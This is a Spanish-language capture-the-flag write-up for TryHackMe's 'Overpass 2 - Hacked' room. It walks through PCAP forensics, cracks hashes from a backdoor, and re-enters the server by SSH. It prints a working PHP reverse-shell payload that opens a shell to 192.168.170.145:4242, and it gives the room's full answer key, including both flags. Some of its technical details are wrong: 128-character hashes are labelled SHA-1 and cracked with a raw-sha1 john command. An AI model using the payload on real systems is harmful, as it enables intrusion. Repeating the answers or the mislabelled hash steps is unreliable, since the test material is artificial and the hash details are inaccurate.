# Overpass 2 - Hacked

| **Dificultad** | Easy |
| **Tipo** | Forense de tráfico de red (PCAP) y explotación de un servidor comprometido (CTF) |
| **Slug** | `overpass2hacked` |
| **Link** | [TryHackMe](https://tryhackme.com/room/overpass2hacked) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | Wireshark / análisis de tráfico HTTP y TCP / reverse shell (mkfifo + nc) / zip cifrado / hashcat / john / backdoor OpenSSH (ssh-backdoor) / GitHub / SSH / flags |
| **Impacto** | La sala es la continuación de "Overpass": la máquina de Overpass ha sido comprometida y se nos entrega un archivo PCAP con la captura de la intrusión. Se debe analizar el tráfico con Wireshark para reconstruir el ataque (webshell en `/development/`, reverse shell, fuga de credenciales, instalación de un backdoor tipo OpenSSH), descifrar los hashes expuestos, investigar la fuente del backdoor (ssh-backdoor de GitHub) y, por último, usar toda esa información para volver a entrar en el servidor, obtener las flags de usuario y de root y leer los mensajes de desfiguración (defacement) del equipo atacante. |

---

**Contexto:** La sala entrega un archivo de captura de tráfico (`overpass2.pcapng`) en el que se registró el ataque real contra la máquina Overpass. La fase 1 es forense de PCAP: con Wireshark se sigue el stream HTTP y se descubre que el atacante subió un reverse shell a la carpeta `/development/`, un payload PHP que usa `mkfifo`, `nc` y una conexión a `192.168.170.145:4242`; en el tráfico se ve además cómo el atacante descarga un kit cifrado con la contraseña `whenevernoteartinstant`, cuyo contenido apunta al backdoor `ssh-backdoor` de `https://github.com/NinjaJc01/ssh-backdoor`. La fase 2 profundiza en ese backdoor: se identifican los hashes de las contraseñas hardcodeadas en su código y se descifran con john/hashcat (`november16`). La fase 3 es práctica: se recupera el acceso al servidor Overpass vía el backdoor con las credenciales comprometidas, se confirma el mensaje de defacement `H4ck3d by CooctusClan` y se capturan las flags `thm{d119b4fa8c497ddb0525f7ad200e6567}` (usuario) y `thm{d53b2684f169360bb9606c333873144d}` (root).

## Solucionario

### Task 1: Capturando la intrusión (análisis del PCAP)

**Explicación:** Se abre `overpass2.pcapng` con Wireshark y se sigue la conversación HTTP (el primer prompt `Follow HTTP stream`). El atacante encontró el directorio `/development/` del servidor web y subió un archivo PHP con un payload de reverse shell que ejecuta `rm /tmp/f; mkfifo /tmp/f; ... nc 192.168.170.145 4242` (técnica clásica de FIFO + netcat). Siguiendo con el análisis se observa cómo descarga e intercambia un archivo ZIP protegido por contraseña: la contraseña usada es `whenevernoteartinstant`. Ese kit contiene referencias al backdoor cuya fuente pública es `https://github.com/NinjaJc01/ssh-backdoor`. Del mismo tráfico se extraen los hashes que el atacante procesa (john/hashcat), obteniendo un total de `4` credenciales en texto plano.

```bash
# Tshark para extraer la conversación del payload del reverse shell
tshark -r overpass2.pcapng -Y "http.request" -T fields -e http.request.uri
# Ver payload completo siguiendo el stream HTTP (Follow HTTP stream)
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál era la URL del directorio que el atacante encontró en el servidor web? | `/development/` |
| 2 | ¿Cuál es el payload del reverse shell que el atacante subió para obtener acceso? | `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>` |
| 3 | ¿Qué contraseña utilizó el atacante para proteger/enviar el kit descargado? | `whenevernoteartinstant` |
| 4 | ¿Cuál es la fuente (repositorio de GitHub) del backdoor que instaló? | `https://github.com/NinjaJc01/ssh-backdoor` |
| 5 | ¿Cuántas credenciales (contraseñas) consiguió descifrar el atacante? | `4` |

### Task 2: Investigando más a fondo (el backdoor)

**Explicación:** Se examina la fuente del backdoor `ssh-backdoor`. El código deja hardcodeadas varias contraseñas en forma de hashes; de la investigación se obtienen los siguientes valores: un hash largo SHA-1/sha512 correspondiente a la contraseña del usuario del backdoor, un hash MD5 y otro hash SHA-1. Pasándolos por john/hashcat con diccionarios (`rockyou.txt`) se descifra la contraseña de texto plano `november16`, que es la que confirma el compromiso del servidor.

```bash
# Descifrado de los hashes extraídos del backdoor
echo "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3" > hash1.txt
john --format=raw-sha1 hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
# repite con el hash MD5 y el segundo SHA-1
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el primero de los hashes (SHA-1) de contraseña que encontramos en el código del backdoor? | `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` |
| 2 | ¿Cuál es el hash MD5 de contraseña que aparece en el código? | `1c362db832f3f864c8c2fe05f2002a05` |
| 3 | ¿Cuál es el tercer hash (SHA-1) de contraseña del backdoor? | `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` |
| 4 | ¿Qué contraseña en texto plano se obtiene al descifrar los hashes? | `november16` |

### Task 3: Atacando el servidor (overpass)

**Explicación:** Con las credenciales comprometidas (`november16`) y el backdoor estudiado, se obtiene acceso al servidor Overpass por SSH. Al entrar se confirma el mensaje de defacement que dejaron los atacantes (`H4ck3d by CooctusClan`) y se localizan las flags: una en la sesión del usuario (flag de user) y otra tras escalar a root (flag de root).

```bash
ssh <user>@<IP>
# password: november16
ls -la /home/<user>
cat user.txt
sudo su / su -
cat /root/root.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué texto aparece en el mensaje de la máquina (defacement)? | `H4ck3d by CooctusClan` |
| 2 | Usa el backdoor/las credenciales comprometidas para acceder al servidor. | `No answer needed` |
| 3 | ¿Cuál es la flag de usuario? | `thm{d119b4fa8c497ddb0525f7ad200e6567}` |
| 4 | ¿Cuál es la flag de root? | `thm{d53b2684f169360bb9606c333873144d}` |

---

**Metodología:** Forense sobre el PCAP con Wireshark (Follow HTTP stream) para reconstruir el ataque paso a paso: webshell en `/development/`, reverse shell PHP, credenciales y kit zip cifrado. A continuación se extrae la fuente del backdoor (GitHub ssh-backdoor), se identifican los hashes hardcodeados y se descifran con john/hashcat para obtener `november16`. Finalmente se explota activamente la máquina: acceso SSH con las credenciales comprometidas, confirmación del defacement y captura de las flags de usuario y root.
**Learning chain:** análisis de tráfico (pcap) → reconstrucción del ataque (reverse shell, zip cifrado, backdoor) → investigación de la fuente (GitHub) → cracking de hashes → acceso persistente real → flags de user/root.
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell), T1059.006 (Command and Scripting Interpreter: Python), T1078 (Valid Accounts), T1021.001 (Remote Services: SSH), T1041 (Exfiltration Over C2 Channel)
**Fuente:** [TryHackMe - Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
